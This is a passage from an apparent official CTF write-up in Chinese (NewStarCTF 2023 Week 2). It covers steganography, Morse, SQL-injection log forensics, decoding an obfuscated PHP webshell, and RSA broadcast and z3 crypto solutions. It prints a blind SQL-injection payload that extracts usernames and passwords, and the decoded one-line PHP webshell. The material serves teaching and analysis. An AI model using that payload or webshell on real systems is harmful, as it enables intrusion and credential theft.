href="https://github.com/ww23/BlindWaterMark?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgxNTMzMzYsImZpbGVHVUlEIjoiRHk1ZWtISmhLbzBhcDV2MyIsImlhdCI6MTY5ODE1MzAzNiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMzMzU1NDY5MH0.NYa72qmxddXM9lcSzdala4nuJOWnkiUXyE99uwpsEwA" target="_blank" rel="noopener noreferrer nofollow">https://github.com/ww23/BlindWaterMark</a></p><p ql-global="true" line="TDDK"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1068" height="auto" ori-width="1068" src="./NewStarCTF 2023 Week2 官方WriteUp_files/图片(7).png" ori-height="76" data-src="https://uploader.shimo.im/f/jee7bfhS65WQvyxo.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="ikNA"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1532" height="auto" ori-width="1532" src="./NewStarCTF 2023 Week2 官方WriteUp_files/图片(8).png" ori-height="620" data-src="https://uploader.shimo.im/f/ufzQCXqKrMNrjbfi.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="oPYq">得到FLAG：flag{3bb3c3a628a94c}</p><p ql-global="true" line="XuMX"><br></p><h1><div ql-global="true" line="t3Ks" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span><span class="ql-font-microsoftyahei">base!</span></div></h1><ul data-list-style="circle"><li ql-global="true" line="XciB" class="bullet-item"><strong>考点</strong>：Base64隐写</li></ul><ul data-list-style="circle"><li ql-global="true" line="ghE7" class="bullet-item"><strong>FLAG</strong>：<span class="ql-font-microsoftyahei">flag{b4se_1s_4_g0od_c0d3}</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="J9Uq" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="4Y0S">题目考查Base64隐写，可以参考这篇文章的原理：<a class="ql-link" href="https://cloud.tencent.com/developer/article/2160364?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgxNTMzMzYsImZpbGVHVUlEIjoiRHk1ZWtISmhLbzBhcDV2MyIsImlhdCI6MTY5ODE1MzAzNiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMzMzU1NDY5MH0.NYa72qmxddXM9lcSzdala4nuJOWnkiUXyE99uwpsEwA" target="_blank" rel="noopener noreferrer nofollow">https://cloud.tencent.com/developer/article/2160364</a></p><p ql-global="true" line="ryX7">提取隐写内容的脚本，注意以python2运行：</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="dH6i" data-language="python" class="ql-code-block ql-word-wrap-true">b64chars = <span class="hljs-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></div><div line="gw1q" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="Vk16" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'base.txt'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:</div><div line="pAeg" data-language="python" class="ql-code-block ql-word-wrap-true">    bin_str = <span class="hljs-string">''</span></div><div line="eOhe" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():</div><div line="TH7Z" data-language="python" class="ql-code-block ql-word-wrap-true">        stegb64 = <span class="hljs-string">''</span>.join(line.split())</div><div line="NlAW" data-language="python" class="ql-code-block ql-word-wrap-true">        rowb64 =  <span class="hljs-string">''</span>.join(stegb64.decode(<span class="hljs-string">'base64'</span>).encode(<span class="hljs-string">'base64'</span>).split())</div><div line="ql9s" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="tTDs" data-language="python" class="ql-code-block ql-word-wrap-true">        offset = <span class="hljs-built_in">abs</span>(b64chars.index(stegb64.replace(<span class="hljs-string">'='</span>,<span class="hljs-string">''</span>)[-<span class="hljs-number">1</span>])-b64chars.index(rowb64.replace(<span class="hljs-string">'='</span>,<span class="hljs-string">''</span>)[-<span class="hljs-number">1</span>]))</div><div line="yWen" data-language="python" class="ql-code-block ql-word-wrap-true">        equalnum = stegb64.count(<span class="hljs-string">'='</span>) <span class="hljs-comment">#no equalnum no offset</span></div><div line="LJ1T" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="eGwC" data-language="python" class="ql-code-block ql-word-wrap-true">        <span class="hljs-keyword">if</span> equalnum:</div><div line="KZfD" data-language="python" class="ql-code-block ql-word-wrap-true">            bin_str += <span class="hljs-built_in">bin</span>(offset)[<span class="hljs-number">2</span>:].zfill(equalnum * <span class="hljs-number">2</span>)</div><div line="lBXB" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="3oh7" data-language="python" class="ql-code-block ql-word-wrap-true">        <span class="hljs-built_in">print</span> <span class="hljs-string">''</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(bin_str[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bin_str), <span class="hljs-number">8</span>)])</div></div><p ql-global="true" line="V7OX">得到隐写内容：</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="Q7gt" data-language="python" class="ql-code-block ql-word-wrap-true">iDMb6ZMnTFMtFuouYZHwPTYAoWjC7Hjca8</div></div><p ql-global="true" line="8wWm">Base58解密得到Flag：</p><p ql-global="true" line="lgFg"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="958" height="auto" ori-width="958" src="./NewStarCTF 2023 Week2 官方WriteUp_files/图片(9).png" ori-height="610" data-src="https://uploader.shimo.im/f/uO8GYWPiQJgjYhtg.png!thumbnail" crossorigin="anonymous"></span></span></span></p><h1><div ql-global="true" line="BTqN" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span><br></div></h1><h1><div ql-global="true" line="Ni7G" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span><span class="ql-font-microsoftyahei">新建Word文档</span></div></h1><ul data-list-style="circle"><li ql-global="true" line="JcK3" class="bullet-item"><strong>考点</strong>：<span class="ql-font-microsoftyahei">Word文档隐藏文字、新佛曰加密</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="2oBL" class="bullet-item"><strong>FLAG</strong>：<span class="ql-font-microsoftyahei">flag{Th1s_F0_1s_s00_Cyp3r_495586e3df3a}</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="KjbG" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="ZF5i">打开Word文档查看隐藏字体可以得到如下密文：</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="MQW9" data-language="python" class="ql-code-block ql-word-wrap-true">新佛曰：毘諸隸僧降吽諸陀摩隸僧缽薩願毘耨咤陀願羅咤喃修願宣亦宣寂叻寂阿是吽阿塞尊劫毘般毘所聞降毘咒塞尊薩咒毘所若降般斯毘嚴毘嚴波斯迦毘色毘波嚴毘喃念若修嘚般毘我毘如毘如囑囑</div></div><p ql-global="true" line="mqyD">WPS可以选择“清除格式”来得到密文。</p><p ql-global="true" line="FzEv">新佛曰加密，利用在线工具 <a class="ql-link" href="http://hi.pcmoe.net/buddha.html?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgxNTMzMzYsImZpbGVHVUlEIjoiRHk1ZWtISmhLbzBhcDV2MyIsImlhdCI6MTY5ODE1MzAzNiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMzMzU1NDY5MH0.NYa72qmxddXM9lcSzdala4nuJOWnkiUXyE99uwpsEwA" target="_blank" rel="noopener noreferrer nofollow">http://hi.pcmoe.net/buddha.html</a> 进行解密得到Flag：</p><p ql-global="true" line="dEEF"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="751" height="auto" ori-width="751" src="./NewStarCTF 2023 Week2 官方WriteUp_files/图片(10).png" ori-height="630" data-src="https://uploader.shimo.im/f/Z25pDfYZlbljW2MG.png!thumbnail" crossorigin="anonymous"></span></span></span></p><h1><div ql-global="true" line="ikCV" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span><br></div></h1><h1><div ql-global="true" line="E8kx" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span><span class="ql-font-microsoftyahei">永不消逝的电波</span></div></h1><ul data-list-style="circle"><li ql-global="true" line="TzIa" class="bullet-item"><strong>考点</strong>：<span class="ql-font-microsoftyahei">音频摩斯电码</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="mLmq" class="bullet-item"><strong>FLAG</strong>：<span class="ql-font-microsoftyahei">flag{thebestctferisyou}</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="zKOt" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="gyAC">打开音频可以听到有节奏的滴答声，使用Audacity查看波形图推断是摩斯电码：</p><p ql-global="true" line="508Y"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1823" height="auto" ori-width="1823" src="./NewStarCTF 2023 Week2 官方WriteUp_files/图片(11).png" ori-height="935" data-src="https://uploader.shimo.im/f/FNHQnxsRnSTVJtI4.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="rZMv">将摩斯电码提取出来：</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="i95w" data-language="python" class="ql-code-block ql-word-wrap-true">..-./.-../.-/--./-/...././-..././.../-/-.-./-/..-././.-./../.../-.--/---/..-</div></div><p ql-global="true" line="Us3L">解码得到：</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="HNB1" data-language="python" class="ql-code-block ql-word-wrap-true">flagthebestctferisyou</div></div><p ql-global="true" line="PYV8">根据题目提示包裹花括号得到FLAG：</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="nWN8" data-language="python" class="ql-code-block ql-word-wrap-true">flag{thebestctferisyou}</div></div><p ql-global="true" line="l6bM"><br></p><h1><div ql-global="true" line="Q5d7" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>1-序章</div></h1><ul data-list-style="circle"><li ql-global="true" line="4M0o" class="bullet-item"><strong>考点</strong>：<span class="ql-font-microsoftyahei">SQL注入日志分析</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="Z6NI" class="bullet-item"><strong>FLAG</strong>：<span class="ql-font-microsoftyahei">flag{just_w4rm_up_s0_you_n3ed_h4rder_6026cd32}</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="Dqfm" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="BUXv">题目给出了Web请求日志，经过分析可以看出是SQL盲注的日志信息，Payload为：</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="ebxH" data-language="python" class="ql-code-block ql-word-wrap-true">-<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">ascii</span>(substr((select group_concat(username,password) <span class="hljs-keyword">from</span> user),位数,<span class="hljs-number">1</span>))=字符ASCII码,sleep(<span class="hljs-number">1</span>),<span class="hljs-number">1</span>)--+</div></div><p ql-global="true" line="rQVQ">当注入到某一位的正确字符后会结束这一位的爆破，进行下一位的注入，例如</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="LYnL" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> - - [<span class="hljs-number">20</span>/Aug/<span class="hljs-number">2023</span>:<span class="hljs-number">00</span>:08:<span class="hljs-number">44</span> +0800] <span class="hljs-string">"GET /app/action/edit_sell.php?pid%5B0%5D=-1%20or%20if(ascii(substr((select%20group_concat(username,password)%20from%20user),7,1))=110,sleep(1),1)--+&amp;totalPrice=0 HTTP/1.1"</span> <span class="hljs-number">500</span> <span class="hljs-number">353</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"python-requests/2.28.2"</span></div><div line="U1aE" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-number">172.17</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> - - [<span class="hljs-number">20</span>/Aug/<span class="hljs-number">2023</span>:<span class="hljs-number">00</span>:08:<span class="hljs-number">47</span> +0800] <span class="hljs-string">"GET /app/action/edit_sell.php?pid%5B0%5D=-1%20or%20if(ascii(substr((select%20group_concat(username,password)%20from%20user),8,1))=40,sleep(1),1)--+&amp;totalPrice=0 HTTP/1.1"</span> <span class="hljs-number">500</span> <span class="hljs-number">353</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"python-requests/2.28.2"</span></div></div><p ql-global="true" line="t6CR">如上的日志信息就说明第7位字符的ASCII码为110，根据这个原理可以编写脚本来提取日志中的注入结果，也有很多现成的脚本稍微修改一下就可以使用，可以参考这篇文章的分析：<a class="ql-link" href="https://www.cnblogs.com/0yst3r-2046/p/12322110.html?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgxNTMzMzYsImZpbGVHVUlEIjoiRHk1ZWtISmhLbzBhcDV2MyIsImlhdCI6MTY5ODE1MzAzNiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMzMzU1NDY5MH0.NYa72qmxddXM9lcSzdala4nuJOWnkiUXyE99uwpsEwA" target="_blank" rel="noopener noreferrer nofollow">https://www.cnblogs.com/0yst3r-2046/p/12322110.html</a></p><p ql-global="true" line="rVWs">稍微修改一下脚本，需要以Python2运行：</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="yuxW" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment"># coding:utf-8</span></div><div line="gg8j" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">import</span> re</div><div line="glb9" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">import</span> urllib</div><div line="F0BF" data-language="python" class="ql-code-block ql-word-wrap-true"> </div><div line="dRa7" data-language="python" class="ql-code-block ql-word-wrap-true">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">'access.log'</span>,<span class="hljs-string">'r'</span>)</div><div line="RxhR" data-language="python" class="ql-code-block ql-word-wrap-true">lines = f.readlines()</div><div line="jFQ4" data-language="python" class="ql-code-block ql-word-wrap-true">datas = []</div><div line="gIwR" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:</div><div line="2PBO" data-language="python" class="ql-code-block ql-word-wrap-true">    t = urllib.unquote(line) </div><div line="XXN3" data-language="python" class="ql-code-block ql-word-wrap-true">    datas.append(t)</div><div line="GU9Z" data-language="python" class="ql-code-block ql-word-wrap-true"> </div><div line="uafV" data-language="python" class="ql-code-block ql-word-wrap-true">flag_ascii = {}  </div><div line="ZCwG" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> datas:</div><div line="kbdY" data-language="python" class="ql-code-block ql-word-wrap-true">    matchObj = re.search( <span class="hljs-string">r'user\),(.*?),1\)\)=(.*?),sleep'</span>, data)</div><div line="zWz1" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">if</span> matchObj:</div><div line="Vpkt" data-language="python" class="ql-code-block ql-word-wrap-true">        key = <span class="hljs-built_in">int</span>(matchObj.group(<span class="hljs-number">1</span>))</div><div line="zZUs" data-language="python" class="ql-code-block ql-word-wrap-true">        value = <span class="hljs-built_in">int</span>(matchObj.group(<span class="hljs-number">2</span>))</div><div line="idof" data-language="python" class="ql-code-block ql-word-wrap-true">        flag_ascii[key] = value</div><div line="YKdR" data-language="python" class="ql-code-block ql-word-wrap-true">        </div><div line="kpvi" data-language="python" class="ql-code-block ql-word-wrap-true">flag = <span class="hljs-string">''</span></div><div line="jtlA" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> flag_ascii.values():</div><div line="2SFx" data-language="python" class="ql-code-block ql-word-wrap-true">    flag += <span class="hljs-built_in">chr</span>(value)</div><div line="uFBl" data-language="python" class="ql-code-block ql-word-wrap-true">    </div><div line="5KjE" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-built_in">print</span> flag</div></div><p ql-global="true" line="nYsj">得到注入内容，后半段即为FLAG：</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="Vs9q" data-language="python" class="ql-code-block ql-word-wrap-true">you_w4nt_s3cretflag{just_w4rm_up_s0_you_n3ed_h4rder_6026cd32},</div></div><p ql-global="true" line="o9gK"><br></p><h1><div ql-global="true" line="LNrJ" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>WebShell的利用</div></h1><ul data-list-style="circle"><li ql-global="true" line="Njql" class="bullet-item"><strong>考点</strong>：PHP代码解密</li></ul><ul data-list-style="circle"><li ql-global="true" line="lgVP" class="bullet-item"><strong>FLAG</strong>：动态FLAG</li></ul><ul data-list-style="circle"><li ql-global="true" line="ZbKd" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="pxgC">其实这道题偏向于Web题目，代码加密也很简单，在分析时可以将eval修改为echo，调试几次之后发现其实解密方式是固定的，只是进行了嵌套多次加密，由此可以编写PHP脚本对WebShell脚本进行解密：</p><div class="ql-code-block-container" data-language="php" word-wrap="" spellcheck="false"><div line="J4Vw" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-meta">&lt;?php</span></div><div line="4rIi" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-variable">$shell</span> = <span class="hljs-string">"eval(str_rot13(convert_uudecode(str_rot13(base64_decode('此处省略题目文件中的编码内容')))));"</span>;</div><div line="ZJbn" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;<span class="hljs-number">50</span>; <span class="hljs-variable">$i</span>++){</div><div line="DPGX" data-language="php" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/base64/"</span>,<span class="hljs-variable">$shell</span>)){</div><div line="MtOC" data-language="php" class="ql-code-block ql-word-wrap-true">        <span class="hljs-variable">$tmp</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">"/eval/"</span>,<span class="hljs-string">"return "</span>,<span class="hljs-variable">$shell</span>);</div><div line="tIKj" data-language="php" class="ql-code-block ql-word-wrap-true">        <span class="hljs-variable">$shell</span> = <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$tmp</span>);</div><div line="eFvF" data-language="php" class="ql-code-block ql-word-wrap-true">    }<span class="hljs-keyword">else</span>{</div><div line="kcQM" data-language="php" class="ql-code-block ql-word-wrap-true">        <span class="hljs-keyword">break</span>;</div><div line="p7Sy" data-language="php" class="ql-code-block ql-word-wrap-true">    }</div><div line="o4Hx" data-language="php" class="ql-code-block ql-word-wrap-true">}</div><div line="YPsY" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">echo</span> <span class="hljs-variable">$shell</span>;</div></div><p ql-global="true" line="xisg">最终得到WebShell：</p><div class="ql-code-block-container" data-language="php" word-wrap="" spellcheck="false"><div line="kVtq" data-language="php" class="ql-code-block ql-word-wrap-true"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'7d67973a'</span>])(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'9fa3'</span>]);</div></div><p ql-global="true" line="LYyj">这里就是一个简单的函数的动态调用，GET传入函数名，POST传入函数参数：</p><p ql-global="true" line="XAFa"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="821" height="auto" ori-width="821" src="./NewStarCTF 2023 Week2 官方WriteUp_files/图片(12).png" ori-height="429" data-src="https://uploader.shimo.im/f/EJgG8aqfAhUwt1NT.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="lgQ7"><br></p><p ql-global="true" class="ql-align-center ql-heading-title" line="xxPC" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>Crypto</p><p ql-global="true" line="n1Ix"><br></p><h1><div ql-global="true" line="BG44" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>broadcast</div></h1><ul data-list-style="circle"><li ql-global="true" line="kiz6" class="bullet-item"><strong>考点</strong>：broadcast</li></ul><ul data-list-style="circle"><li ql-global="true" line="RU9j" class="bullet-item"><strong>FLAG</strong>：动态FLAG</li></ul><ul data-list-style="circle"><li ql-global="true" line="RR1d" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="tnJF"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1187" height="auto" ori-width="1187" src="./NewStarCTF 2023 Week2 官方WriteUp_files/image(1).png" ori-height="634" data-src="https://uploader.shimo.im/f/vQYJk4oOORyc5uFM.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="7GHV">阅读源码我们可以知道，可以通过输入多个1选项来获取多组n, c。获取足够多的组数就可以在不分解n的情况下求出m^e了。</p><p ql-global="true" line="JDVp">下面是交互代码：</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="9uQ2" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">import</span> gmpy2</div><div line="lqQf" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *</div><div line="vaR5" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">def</span> <span class="hljs-title function_">CRT</span>(<span class="hljs-params">cList, nList</span>):</div><div line="jIE4" data-language="python" class="ql-code-block ql-word-wrap-true">    M = <span class="hljs-number">1</span></div><div line="bMQE" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> nList:</div><div line="mvK5" data-language="python" class="ql-code-block ql-word-wrap-true">        M = M * i   <span class="hljs-comment">#计算M = ∏ mi</span></div><div line="XUrf" data-language="python" class="ql-code-block ql-word-wrap-true">    x = <span class="hljs-number">0</span></div><div line="7y6P" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(nList)):</div><div line="hH9i" data-language="python" class="ql-code-block ql-word-wrap-true">        Mi = M // nList[i]</div><div line="w633" data-language="python" class="ql-code-block ql-word-wrap-true">        Mi_inverse = gmpy2.invert(Mi, nList[i])</div><div line="BxbY" data-language="python" class="ql-code-block ql-word-wrap-true">        x += cList[i] * Mi * Mi_inverse</div><div line="Wrow" data-language="python" class="ql-code-block ql-word-wrap-true">    x = x % M</div><div line="DlLT" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">return</span> x</div><div line="asUp" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</div><div line="2Ojl" data-language="python" class="ql-code-block ql-word-wrap-true">context.log_level= <span class="hljs-string">"debug"</span></div><div line="xR8Z" data-language="python" class="ql-code-block ql-word-wrap-true">p = remote(<span class="hljs-string">"node4.buuoj.cn"</span>, <span class="hljs-number">25450</span>)</div><div line="KmM9" data-language="python" class="ql-code-block ql-word-wrap-true">n_list = []</div><div line="hhK6" data-language="python" class="ql-code-block ql-word-wrap-true">c_list = []</div><div line="OOXB" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">17</span>):</div><div line="K2N0" data-language="python" class="ql-code-block ql-word-wrap-true">    p.recvuntil(<span class="hljs-string">b'&gt; '</span>)</div><div line="Imez" data-language="python" class="ql-code-block ql-word-wrap-true">    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))</div><div line="HRNc" data-language="python" class="ql-code-block ql-word-wrap-true">    n = <span class="hljs-built_in">int</span>(p.recvline().decode().strip(<span class="hljs-string">'\n'</span>).split(<span class="hljs-string">'='</span>)[<span class="hljs-number">1</span>])</div><div line="V4Pd" data-language="python" class="ql-code-block ql-word-wrap-true">    c = <span class="hljs-built_in">int</span>(p.recvline().decode().strip(<span class="hljs-string">'\n'</span>).split(<span class="hljs-string">'='</span>)[<span class="hljs-number">1</span>])</div><div line="neYc" data-language="python" class="ql-code-block ql-word-wrap-true">    n_list.append(n)</div><div line="Phq9" data-language="python" class="ql-code-block ql-word-wrap-true">    c_list.append(c)</div><div line="jiOW" data-language="python" class="ql-code-block ql-word-wrap-true">m = CRT(c_list, n_list)</div><div line="Tu3e" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-built_in">print</span>(m)</div><div line="4tZx" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-built_in">print</span>(long_to_bytes(gmpy2.iroot(m, <span class="hljs-number">17</span>)[<span class="hljs-number">0</span>]))</div></div><p ql-global="true" line="fXzC"><br></p><h1><div ql-global="true" line="z39x" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>rotate_xor</div></h1><ul data-list-style="circle"><li ql-global="true" line="FEpQ" class="bullet-item"><strong>考点</strong>：Z3求解器的简单使用</li></ul><ul data-list-style="circle"><li ql-global="true" line="jzJN" class="bullet-item"><strong>FLAG</strong>：flag{z3_s0lv3r_15_bri11i4nt}</li></ul><ul data-list-style="circle"><li ql-global="true" line="9RLZ" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="KEsK">z3一把梭(</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="qWWn" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *</div><div line="JLyH" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *</div><div line="UBKc" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> xor</div><div line="tTrA" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="6LfM" data-language="python" class="ql-code-block ql-word-wrap-true">ROUND = <span class="hljs-number">12</span></div><div line="YTsc" data-language="python" class="ql-code-block ql-word-wrap-true">s = Solver()</div><div line="KUP0" data-language="python" class="ql-code-block ql-word-wrap-true">ciphertext = <span class="hljs-string">b'\x8dSyy\xd2\xce\xe2\xd2\x98\x0fth\x9a\xc6\x8e\xbc\xde`zl\xc0\x85\xe0\xe4\xdfQlc'</span></div><div line="pADv" data-language="python" class="ql-code-block ql-word-wrap-true">enc_k1 = BitVecVal(<span class="hljs-number">7318833940520128665</span>, <span class="hljs-number">64</span>)</div><div line="0MqQ" data-language="python" class="ql-code-block ql-word-wrap-true">k2 = BitVecVal(<span class="hljs-number">9982833494309156947</span>, <span class="hljs-number">64</span>)</div><div line="IbDS" data-language="python" class="ql-code-block ql-word-wrap-true">k1 = BitVec(<span class="hljs-string">'k1'</span>, <span class="hljs-number">64</span>)</div><div line="PYMx" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="zVXU" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_key</span>(<span class="hljs-params">key</span>):</div><div line="PMaa" data-language="python" class="ql-code-block ql-word-wrap-true">    </div><div line="izED" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ROUND):</div><div line="ceFN" data-language="python" class="ql-code-block ql-word-wrap-true">        key = RotateLeft(key, <span class="hljs-number">3</span>) ^ k2</div><div line="U1bn" data-language="python" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">return</span> key</div><div 